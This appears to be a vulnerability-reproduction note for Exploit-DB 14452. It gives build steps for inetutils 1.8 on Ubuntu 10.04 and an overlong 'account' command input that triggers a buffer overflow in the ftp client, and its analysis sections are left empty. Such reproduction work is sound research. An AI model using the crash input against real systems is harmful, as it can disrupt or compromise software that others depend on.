# EDB-14452

## Experiment Environment

Ubuntu 10.04

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/EDB-14452/inetutils-1.8.tar.gz
tar -xvf inetutils-1.8.tar.gz
cd inetutils-1.8/
./configure
make
```

## Problems in Installation & Configuration


## How to trigger vulnerability

```
cd ftp

./ftp localhost
## login with normal user
ftp> account aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

## PoCs

[FTP Client 0.17-19build1 ACCT (Ubuntu 10.04) - Buffer Overflow (PoC)](https://www.exploit-db.com/exploits/14452/)

## Vulnerability Details & Patch

### Root Cause

### Stack Trace

### Patch

## References
